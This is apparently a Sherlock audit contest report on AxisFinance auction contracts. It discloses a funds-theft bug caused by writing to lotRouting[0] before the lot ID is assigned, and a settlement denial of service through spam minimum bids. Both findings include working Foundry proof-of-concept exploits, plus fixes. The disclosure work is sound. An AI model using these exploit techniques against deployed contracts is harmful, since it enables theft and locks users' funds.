# AxisFinance

> This report contains findings reported in the [AxisFinance](https://audits.sherlock.xyz/contests/206) competition on Sherlock by the me, [@flacko](https://x.com/flack00n), as a part of the Sentryx security team.

# Summary

|Severity|Issues|Unique|
|--|--|--|
|[High](#high)|1|0|
|[Medium](#medium)|1|0|

# Findings

# High

## [Malicious user can overtake a prefunded auction and steal the deposited funds](https://github.com/sherlock-audit/2024-03-axis-finance-judging/issues/12)

### Summary
In the auction house whenever a new auction (lot) is created, its details are recorded at the 0th index in the `lotRouting` mapping. This allows for an attacker to create an auction right after an honest user and take over their auction, allowing them to steal funds in the case of a prefunded auction.

### Vulnerability Detail
When a new auction is created via [AuctionHouse#auction()](https://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/src/bases/Auctioneer.sol#L160-L164), it's routing details are recorded directly in storage at `lotRouting[lotId]` where `lotId` is the return value of the `auction()` function itself. Since the return value is declared as a variable at the function signature level, it is initialized with the value of `0`.

This means that when the `routing` [storage variable is declared](https://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/src/bases/Auctioneer.sol#L174) (`Routing storage routing = lotRouting[lotId];`) it will always point to `lotRouting[0]` as the value of `lotId` is set a bit later in the `auction()` function to the correct index. This itself leads to the issue that an honest user can create a prefunded auction and an attacker can then come in, create a new auction themselves that is not prefunded and be immediately entitled to the honest user's prefunded funds by cancelling the auction they've just created as they're set as the `seller` of the lot at `lotRouting[0]`.

This attack is also possible because the `funding` attribute of a lot is only set if an auction is specified to be prefunded in its parameters at creation.
### Impact
The following POC demonstrates how an attacker can overtake an honest user's auction and steal the funds they've pre-deposited. The attacker only needs to ensure the base token of the malicious auction they are creating is the same as the one of the auction of the honest user. Once that's done, the attacker only needs to cancel the auction and the funds will be transferred to them.

To run the POC just create a file `AuctionHouseTest.t.sol` somewhere under the `./moonraker/test` directory, add `src=/src/` to **remappings.txt** and run it using `forge test --match-test test_overtake_auction_and_steal_prefunded_funds`.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.19;

// Libraries
import {Test} from "forge-std/Test.sol";
import {ERC20} from 'solmate/tokens/ERC20.sol';

import 'src/modules/Modules.sol';
import {Auction} from 'src/modules/Auction.sol';

import {AuctionHouse} from 'src/AuctionHouse.sol';
import {FixedPriceAuctionModule} from 'src/modules/auctions/FPAM.sol';

contract AuctionHouseTest is Test {
  AuctionHouse public auctionHouse;
  FixedPriceAuctionModule public fixedPriceAuctionModule;

  address public OWNER = makeAddr('Owner');
  address public PROTOCOL = makeAddr('Protocol');
  address public PERMIT2 = makeAddr('Permit 2');

  MockERC20 public baseToken = new MockERC20("Base", "BASE", 18);
  MockERC20 public quoteToken = new MockERC20("Quote", "QUOTE", 18);

  function setUp() public {
    vm.warp(1710965574);
    auctionHouse = new AuctionHouse(OWNER, PROTOCOL, PERMIT2);
    fixedPriceAuctionModule = new FixedPriceAuctionModule(address(auctionHouse));

    vm.prank(OWNER);
    auctionHouse.installModule(fixedPriceAuctionModule);
  }

  function test_overtake_auction_and_steal_prefunded_funds() public {
    // Step 1
    uint256 PREFUNDED_AMOUNT = 1_000e18;
    address USER = makeAddr('User');
    vm.startPrank(USER);
    baseToken.mint(PREFUNDED_AMOUNT);
    baseToken.approve(address(auctionHouse), PREFUNDED_AMOUNT);

    AuctionHouse.RoutingParams memory routingParams;
    routingParams.auctionType = keycodeFromVeecode(fixedPriceAuctionModule.VEECODE());
    routingParams.baseToken = baseToken;
    routingParams.quoteToken = quoteToken;
    routingParams.prefunded = true;

    Auction.AuctionParams memory auctionParams;
    auctionParams.start = uint48(block.timestamp + 1 weeks);
    auctionParams.duration = 5 days;
    auctionParams.capacity = uint96(PREFUNDED_AMOUNT);
    auctionParams.implParams =
      abi.encode(FixedPriceAuctionModule.FixedPriceParams({price: 1e18, maxPayoutPercent: 100_000}));

    auctionHouse.auction(routingParams, auctionParams, "");

    // Step 2
    address ATTACKER = makeAddr('Attacker');
    vm.startPrank(ATTACKER);

    routingParams.prefunded = false;
    auctionHouse.auction(routingParams, auctionParams, "");
	
	// ATTACKER is now the seller of the lot at lotRouting[0]; the lot's funding remains the same
    auctionHouse.cancel(0, "");

    assertEq(baseToken.balanceOf(ATTACKER), PREFUNDED_AMOUNT);
    assertEq(baseToken.balanceOf(USER), 0);
  }
}

contract MockERC20 is ERC20 {
    constructor(
        string memory _name,
        string memory _symbol,
        uint8 _decimals
    ) ERC20(_name, _symbol, _decimals) {}

    function mint(uint256 amount) public {
      _mint(msg.sender, amount);
    }
}
```
### Code Snippet
https://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/src/bases/Auctioneer.sol#L160-L164\
https://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/src/bases/Auctioneer.sol#L174\
https://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/src/bases/Auctioneer.sol#L194\
https://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/src/bases/Auctioneer.sol#L211-L212\
### Tool used
Manual Review
Foundry Forge

### Recommendation
```diff
diff --git a/moonraker/src/bases/Auctioneer.sol b/moonraker/src/bases/Auctioneer.sol
index a77585b..48c39d5 100644
--- a/moonraker/src/bases/Auctioneer.sol
+++ b/moonraker/src/bases/Auctioneer.sol
@@ -171,6 +171,9 @@ abstract contract Auctioneer is WithModules, ReentrancyGuard {
             revert InvalidParams();
         }
 
+        // Increment lot count and get ID
+        lotId = lotCounter++;
+
         Routing storage routing = lotRouting[lotId];
 
         bool requiresPrefunding;
@@ -190,9 +193,6 @@ abstract contract Auctioneer is WithModules, ReentrancyGuard {
                     || baseTokenDecimals > 18 || quoteTokenDecimals < 6 || quoteTokenDecimals > 18
             ) revert InvalidParams();
 
-            // Increment lot count and get ID
-            lotId = lotCounter++;
-
             // Call module auction function to store implementation-specific data
             (lotCapacity) =
                 auctionModule.auction(lotId, params_, quoteTokenDecimals, baseTokenDecimals);
```

# Medium

## [Marginal price auction can be spammed with minimum bids so honest bidders funds are trapped](https://github.com/sherlock-audit/2024-03-axis-finance-judging/issues/49)

### Summary
Poorly (or intentionally maliciously) set up marginal price auctions can get their `settle()` function DOSed.
### Vulnerability Detail
A malicious seller can set up an auction that makes the process of its settlement vulnerable to DOS attacks by spamming it with worthless bids.

The very minimal requirements imposed upon auction creation are:
1. `minPrice` to be > 0
2. `minBidPercent` to be >= 10 (0.01%)

This means that an auction with:
- `capacity` = 10_000e18 (10 000 tokens, assuming base token has 18 decimals precision)
- `minPrice` = 1
- `minBidPercent` = 10

Will have a `minBidSize` of 1e18, which would mean bids have to be for or over the `minAmount` of 1 wei (`minAmount` is equal to `minBidSize * minPrice / 10**baseTokenDecimals` = `1e18 * 1 / 10**18`).

An honest user comes in with a bid offering 5 000 quote tokens (half of capacity), then a malicious user comes in and places an enormous amount of minimum bids (`amount` of 1, equal to `minAmount`). In order to bring the `settle()` function to a state where it runs out of gas due to the loop in **EMPAM#_getLotMarginalPrice()** it was calculated that approximately 25 000 spam bids are required to bump the gas cost of executing `settle()` above 30 000 000 gas.

The user that intends to DOS the auction settlement needs to place their bids before the sum amount of the existing bids reaches the auction capacity for the DOS attack to work, but other than that there's not much that stops them from performing the attack.

POC:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.19;

import {Test} from "forge-std/Test.sol";
import {ERC20} from 'solmate/tokens/ERC20.sol';

import 'src/modules/Modules.sol';
import {Auction} from 'src/modules/Auction.sol';
import {ECIES, Point} from 'src/lib/ECIES.sol';

import {AuctionHouse} from 'src/AuctionHouse.sol';
import {EncryptedMarginalPriceAuctionModule} from 'src/modules/auctions/EMPAM.sol';
import {FeeManager} from 'src/bases/FeeManager.sol';

contract EMPAMTests is Test {
  AuctionHouse public auctionHouse;
  EncryptedMarginalPriceAuctionModule public empaModule;

  address public OWNER = makeAddr('Owner');
  address public PROTOCOL = makeAddr('Protocol');
  address public PERMIT2 = makeAddr('Permit 2');

  MockERC20 public baseToken = new MockERC20("Base", "BASE", 18);
  MockERC20 public quoteToken = new MockERC20("Quote", "QUOTE", 18);

  function setUp() public {
    vm.warp(1710965574);
    auctionHouse = new AuctionHouse(OWNER, PROTOCOL, PERMIT2);
    empaModule = new EncryptedMarginalPriceAuctionModule(address(auctionHouse));

    vm.prank(OWNER);
    auctionHouse.installModule(empaModule);
  }
  
  function test_spam_auction_so_it_cannot_be_settled() public {
    uint256 _AUCTION_PRIVATE_KEY = 112_233_445_566;
    Point memory auctionKey = ECIES.calcPubKey(Point(1, 2), _AUCTION_PRIVATE_KEY);

    address SELLER = makeAddr('Seller');
    vm.startPrank(SELLER);
    baseToken.mint(10_000e18);
    baseToken.approve(address(auctionHouse), 10_000e18);

    AuctionHouse.RoutingParams memory routingParams;
    routingParams.auctionType = keycodeFromVeecode(empaModule.VEECODE());
    routingParams.baseToken = baseToken;
    routingParams.quoteToken = quoteToken;
    routingParams.prefunded = true;

    // Auction requirements:
    // - minPrice > 0
    // - minBidPercent > 0.01% (10)
    // And then:
    // minBidSize = capacity * minBidPercent / 100_000
    //
    // capacity = 10_000e18
    // minPrice = 1 (wei)
    // minBidPercent = 10 (0.01%)
    // minBidSize = 10_000e18 * 10 / 100_000 = 1e18
    Auction.AuctionParams memory auctionParams;
    auctionParams.start = 0;
    auctionParams.duration = 5 days;
    auctionParams.capacity = 10_000e18;
    auctionParams.implParams = abi.encode(
      EncryptedMarginalPriceAuctionModule.AuctionDataParams({
        minPrice: 1,
        minFillPercent: 100_000, // 100%
        minBidPercent: 10, // 0.01%
        publicKey: auctionKey
      })
    );

    auctionHouse.auction(routingParams, auctionParams, "");

    address HONEST_BIDDER = makeAddr('Honest Bidder');
    vm.startPrank(HONEST_BIDDER);
    quoteToken.mint(5_000e18);
    quoteToken.approve(address(auctionHouse), 5_000e18);

    // Bid Math:
    // minAmount = minBidSize * minPrice / 10**18
    // minAmount = 1e18 * 1 / 10**18
    // minAmount = 1
    AuctionHouse.BidParams memory bidParams;
    bidParams.lotId = 0;
    bidParams.amount = 5_000e18;
    bidParams.auctionData = abi.encode(5_000e18, auctionKey);

    // - Submit normal bids
    auctionHouse.bid(bidParams, "");

    // - Spam bids
    address ATTACKER = makeAddr('Attacker');
    uint64 SPAM_BIDS_NUMBER = 25_000;
    vm.startPrank(ATTACKER);
    quoteToken.mint(SPAM_BIDS_NUMBER);
    quoteToken.approve(address(auctionHouse), SPAM_BIDS_NUMBER);
	
    bidParams.amount = 1;
    bidParams.auctionData = abi.encode(1, auctionKey);

    for (uint256 i = 0; i < SPAM_BIDS_NUMBER; i++) { auctionHouse.bid(bidParams, ""); }

    // Warp till after bid conclusion
    vm.warp(block.timestamp + 6 days);

    // Submit private key and decrypt bids
    empaModule.submitPrivateKey(0, _AUCTION_PRIVATE_KEY, 0);

    empaModule.decryptAndSortBids(0, SPAM_BIDS_NUMBER + 1);

    // Settle
    auctionHouse.settle(0);
  }
}

contract MockERC20 is ERC20 {
    constructor(
        string memory _name,
        string memory _symbol,
        uint8 _decimals
    ) ERC20(_name, _symbol, _decimals) {}

    function mint(uint256 amount) public {
      _mint(msg.sender, amount);
    }
}
```

If we run the POC above with `forge test --match-test test_spam_auction_so_it_cannot_be_settled --gas-report` we can see from the gas report table for **AuctionHouse.sol**

```sh
| src/AuctionHouse.sol:AuctionHouse contract |                 |          |          |          |         |
|--------------------------------------------|-----------------|----------|----------|----------|---------|
| Deployment Cost                            | Deployment Size |          |          |          |         |
| 5253283                                    | 24143           |          |          |          |         |
| Function Name                              | min             | avg      | median   | max      | # calls |
| auction                                    | 333780          | 333780   | 333780   | 333780   | 1       |
| bid                                        | 201416          | 205679   | 201416   | 243234   | 25001   |
| installModule                              | 144693          | 144693   | 144693   | 144693   | 1       |
| isExecOnModule                             | 2400            | 2400     | 2400     | 2400     | 25003   |
| settle                                     | 32708497        | 32708497 | 32708497 | 32708497 | 1       |
```

that `settle()` now costs 32708497 gas to call which would not fit within the block gas limit of 30 million.
### Impact
What will end up happening is the quote tokens of the honest bidders will be stuck in the auction house after the auction ends as bids cannot be refunded after an auction has ended and bids can only be claimed after auction settlement. But as outlined in the vulnerability details section, the auction will be impossible to be settled so all bids will remain non-claimable and non-refundable.

### Code Snippet
https://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/src/modules/auctions/EMPAM.sol#L758\
https://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/src/modules/auctions/EMPAM.sol#L611

### Tool used
Manual Review
Foundry Forge
### Recommendation
Due to the variety of tokens and offerings that can happen through the protocol it's impractical to impose a minimum price requirement that's anything other than 0 (as is now). A more sensible recommendation would be to limit the number of bids a user can place within an auction.

